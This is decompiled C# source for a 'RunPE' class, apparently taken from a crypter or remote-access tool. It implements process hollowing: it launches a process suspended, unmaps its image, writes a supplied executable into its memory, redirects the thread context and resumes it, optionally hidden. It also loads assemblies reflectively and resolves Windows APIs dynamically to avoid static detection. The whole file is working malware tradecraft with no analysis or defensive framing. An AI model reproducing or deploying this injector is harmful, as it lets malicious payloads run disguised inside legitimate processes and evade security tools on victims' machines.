using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000006 RID: 6
[StandardModule]
internal sealed class RunPE
{
	// Token: 0x0600000D RID: 13 RVA: 0x00002E18 File Offset: 0x00001018
	public static void Run3(byte[] data)
	{
		try
		{
			Thread thread = new Thread(new ParameterizedThreadStart(RunPE.Run4));
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start(data);
		}
		catch
		{
		}
	}

	// Token: 0x0600000E RID: 14 RVA: 0x00002E58 File Offset: 0x00001058
	public static void Run4(object o)
	{
		try
		{
			MethodInfo entryPoint = Assembly.Load((byte[])o).EntryPoint;
			if (entryPoint.GetParameters().Length == 1)
			{
				entryPoint.Invoke(null, new object[]
				{
					new string[0]
				});
			}
			else
			{
				entryPoint.Invoke(null, null);
			}
		}
		catch
		{
		}
	}

	// Token: 0x0600000F RID: 15 RVA: 0x00002EB8 File Offset: 0x000010B8
	public static int TryRun(string path, string cmd, byte[] data, bool compatible, bool hidden, string Desktop = "", int PID = 0)
	{
		try
		{
			int num = 1;
			while (!RunPE.HandleRun(path, cmd, data, compatible, hidden, Desktop, PID))
			{
				num++;
				if (num > 10)
				{
					return 0;
				}
			}
			return -1;
		}
		catch
		{
		}
		return 0;
	}

	// Token: 0x06000010 RID: 16
	[DllImport("kernel32", SetLastError = true)]
	private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	// Token: 0x06000011 RID: 17
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	// Token: 0x06000012 RID: 18 RVA: 0x000020B4 File Offset: 0x000002B4
	private static CreateApi LoadApi<CreateApi>(string name, string method)
	{
		return Conversions.ToGenericParameter<CreateApi>(Marshal.GetDelegateForFunctionPointer(RunPE.GetProcAddress(RunPE.LoadLibraryA(ref name), ref method), typeof(CreateApi)));
	}

	// Token: 0x06000013 RID: 19 RVA: 0x00002F00 File Offset: 0x00001100
	private static bool HandleRun(string path, string cmd, byte[] data, bool compatible, bool hidden = false, string Desktop = "", int PID = 0)
	{
		string text = "\"" + path + "\"";
		RunPE.STARTUP_INFORMATION startup_INFORMATION = default(RunPE.STARTUP_INFORMATION);
		RunPE.PROCESS_INFORMATION process_INFORMATION = default(RunPE.PROCESS_INFORMATION);
		startup_INFORMATION.cb = Marshal.SizeOf(typeof(RunPE.STARTUP_INFORMATION));
		if (Desktop.Length > 0)
		{
			startup_INFORMATION.lpDesktop = Desktop;
		}
		if (hidden)
		{
			startup_INFORMATION.wShowWindow = 0;
			startup_INFORMATION.dwFlags = 1;
		}
		try
		{
			if (!string.IsNullOrEmpty(cmd))
			{
				text = text + " " + cmd;
			}
			IntPtr intPtr = 0;
			if (!RunPE.CreateProcessA(path, text, intPtr, intPtr, false, 4U, IntPtr.Zero, null, ref startup_INFORMATION, ref process_INFORMATION))
			{
				throw new Exception();
			}
			int num = BitConverter.ToInt32(data, 60);
			int num2 = BitConverter.ToInt32(data, num + 52);
			int[] array = new int[179];
			array[0] = 65538;
			if (IntPtr.Size == 4)
			{
				if (!RunPE.GetThreadContext(process_INFORMATION.ThreadHandle, array))
				{
					throw new Exception();
				}
			}
			else if (!RunPE.Wow64GetThreadContext(process_INFORMATION.ThreadHandle, array))
			{
				throw new Exception();
			}
			int num3 = array[41];
			int num4 = 0;
			int num5 = 0;
			if (!RunPE.ReadProcessMemory(process_INFORMATION.ProcessHandle, num3 + 8, ref num4, 4, ref num5))
			{
				throw new Exception();
			}
			if (num2 == num4 && RunPE.ZwUnmapViewOfSection(process_INFORMATION.ProcessHandle, num4) != 0)
			{
				throw new Exception();
			}
			int length = BitConverter.ToInt32(data, num + 80);
			int bufferSize = BitConverter.ToInt32(data, num + 84);
			int num6 = RunPE.VirtualAllocEx(process_INFORMATION.ProcessHandle, num2, length, 12288, 64);
			bool flag = false;
			if (!compatible && num6 == 0)
			{
				flag = true;
				num6 = RunPE.VirtualAllocEx(process_INFORMATION.ProcessHandle, 0, length, 12288, 64);
			}
			if (num6 == 0)
			{
				throw new Exception();
			}
			if (!RunPE.WriteProcessMemory(process_INFORMATION.ProcessHandle, num6, data, bufferSize, ref num5))
			{
				throw new Exception();
			}
			int num7 = num + 248;
			int num8 = (int)(BitConverter.ToInt16(data, num + 6) - 1);
			for (int i = 0; i <= num8; i++)
			{
				int num9 = BitConverter.ToInt32(data, num7 + 12);
				int num10 = BitConverter.ToInt32(data, num7 + 16);
				int srcOffset = BitConverter.ToInt32(data, num7 + 20);
				if (num10 != 0)
				{
					byte[] array2 = new byte[num10 - 1 + 1];
					Buffer.BlockCopy(data, srcOffset, array2, 0, array2.Length);
					if (!RunPE.WriteProcessMemory(process_INFORMATION.ProcessHandle, num6 + num9, array2, array2.Length, ref num5))
					{
						throw new Exception();
					}
				}
				num7 += 40;
			}
			byte[] bytes = BitConverter.GetBytes(num6);
			if (!RunPE.WriteProcessMemory(process_INFORMATION.ProcessHandle, num3 + 8, bytes, 4, ref num5))
			{
				throw new Exception();
			}
			int num11 = BitConverter.ToInt32(data, num + 40);
			if (flag)
			{
				num6 = num2;
			}
			array[44] = num6 + num11;
			if (IntPtr.Size == 4)
			{
				if (!RunPE.SetThreadContext(process_INFORMATION.ThreadHandle, array))
				{
					throw new Exception();
				}
			}
			else if (!RunPE.Wow64SetThreadContext(process_INFORMATION.ThreadHandle, array))
			{
				throw new Exception();
			}
			if (RunPE.ResumeThread(process_INFORMATION.ThreadHandle) == -1)
			{
				throw new Exception();
			}
			PID = (int)process_INFORMATION.ProcessId;
		}
		catch
		{
			Process processById = Process.GetProcessById((int)process_INFORMATION.ProcessId);
			if (processById != null)
			{
				processById.Kill();
			}
			return false;
		}
		return true;
	}

	// Token: 0x04000021 RID: 33
	private static readonly RunPE.DelegateResumeThread ResumeThread = RunPE.LoadApi<RunPE.DelegateResumeThread>("kernel32", "ResumeThread");

	// Token: 0x04000022 RID: 34
	private static readonly RunPE.DelegateWow64SetThreadContext Wow64SetThreadContext = RunPE.LoadApi<RunPE.DelegateWow64SetThreadContext>("kernel32", "Wow64SetThreadContext");

	// Token: 0x04000023 RID: 35
	private static readonly RunPE.DelegateSetThreadContext SetThreadContext = RunPE.LoadApi<RunPE.DelegateSetThreadContext>("kernel32", "SetThreadContext");

	// Token: 0x04000024 RID: 36
	private static readonly RunPE.DelegateWow64GetThreadContext Wow64GetThreadContext = RunPE.LoadApi<RunPE.DelegateWow64GetThreadContext>("kernel32", "Wow64GetThreadContext");

	// Token: 0x04000025 RID: 37
	private static readonly RunPE.DelegateGetThreadContext GetThreadContext = RunPE.LoadApi<RunPE.DelegateGetThreadContext>("kernel32", "GetThreadContext");

	// Token: 0x04000026 RID: 38
	private static readonly RunPE.DelegateVirtualAllocEx VirtualAllocEx = RunPE.LoadApi<RunPE.DelegateVirtualAllocEx>("kernel32", "VirtualAllocEx");

	// Token: 0x04000027 RID: 39
	private static readonly RunPE.DelegateWriteProcessMemory WriteProcessMemory = RunPE.LoadApi<RunPE.DelegateWriteProcessMemory>("kernel32", "WriteProcessMemory");

	// Token: 0x04000028 RID: 40
	private static readonly RunPE.DelegateReadProcessMemory ReadProcessMemory = RunPE.LoadApi<RunPE.DelegateReadProcessMemory>("kernel32", "ReadProcessMemory");

	// Token: 0x04000029 RID: 41
	private static readonly RunPE.DelegateZwUnmapViewOfSection ZwUnmapViewOfSection = RunPE.LoadApi<RunPE.DelegateZwUnmapViewOfSection>("ntdll", "ZwUnmapViewOfSection");

	// Token: 0x0400002A RID: 42
	public static readonly RunPE.DelegateCreateProcessA CreateProcessA = RunPE.LoadApi<RunPE.DelegateCreateProcessA>("kernel32", "CreateProcessA");

	// Token: 0x02000007 RID: 7
	// (Invoke) Token: 0x06000017 RID: 23
	private delegate int DelegateResumeThread(IntPtr handle);

	// Token: 0x02000008 RID: 8
	// (Invoke) Token: 0x0600001B RID: 27
	private delegate bool DelegateWow64SetThreadContext(IntPtr thread, int[] context);

	// Token: 0x02000009 RID: 9
	// (Invoke) Token: 0x0600001F RID: 31
	private delegate bool DelegateSetThreadContext(IntPtr thread, int[] context);

	// Token: 0x0200000A RID: 10
	// (Invoke) Token: 0x06000023 RID: 35
	private delegate bool DelegateWow64GetThreadContext(IntPtr thread, int[] context);

	// Token: 0x0200000B RID: 11
	// (Invoke) Token: 0x06000027 RID: 39
	private delegate bool DelegateGetThreadContext(IntPtr thread, int[] context);

	// Token: 0x0200000C RID: 12
	// (Invoke) Token: 0x0600002B RID: 43
	private delegate int DelegateVirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);

	// Token: 0x0200000D RID: 13
	// (Invoke) Token: 0x0600002F RID: 47
	private delegate bool DelegateWriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

	// Token: 0x0200000E RID: 14
	// (Invoke) Token: 0x06000033 RID: 51
	private delegate bool DelegateReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

	// Token: 0x0200000F RID: 15
	// (Invoke) Token: 0x06000037 RID: 55
	private delegate int DelegateZwUnmapViewOfSection(IntPtr process, int baseAddress);

	// Token: 0x02000010 RID: 16
	// (Invoke) Token: 0x0600003B RID: 59
	public delegate bool DelegateCreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref RunPE.STARTUP_INFORMATION startupInfo, ref RunPE.PROCESS_INFORMATION processInformation);

	// Token: 0x02000011 RID: 17
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct PROCESS_INFORMATION
	{
		// Token: 0x0400002B RID: 43
		public IntPtr ProcessHandle;

		// Token: 0x0400002C RID: 44
		public IntPtr ThreadHandle;

		// Token: 0x0400002D RID: 45
		public uint ProcessId;

		// Token: 0x0400002E RID: 46
		public uint ThreadId;
	}

	// Token: 0x02000012 RID: 18
	public struct STARTUP_INFORMATION
	{
		// Token: 0x0400002F RID: 47
		public int cb;

		// Token: 0x04000030 RID: 48
		public string lpReserved;

		// Token: 0x04000031 RID: 49
		public string lpDesktop;

		// Token: 0x04000032 RID: 50
		public string lpTitle;

		// Token: 0x04000033 RID: 51
		public int dwX;

		// Token: 0x04000034 RID: 52
		public int dwY;

		// Token: 0x04000035 RID: 53
		public int dwXSize;

		// Token: 0x04000036 RID: 54
		public int dwYSize;

		// Token: 0x04000037 RID: 55
		public int dwXCountChars;

		// Token: 0x04000038 RID: 56
		public int dwYCountChars;

		// Token: 0x04000039 RID: 57
		public int dwFillAttribute;

		// Token: 0x0400003A RID: 58
		public int dwFlags;

		// Token: 0x0400003B RID: 59
		public short wShowWindow;

		// Token: 0x0400003C RID: 60
		public short cbReserved2;

		// Token: 0x0400003D RID: 61
		public int lpReserved2;

		// Token: 0x0400003E RID: 62
		public int hStdInput;

		// Token: 0x0400003F RID: 63
		public int hStdOutput;

		// Token: 0x04000040 RID: 64
		public int hStdError;
	}
}
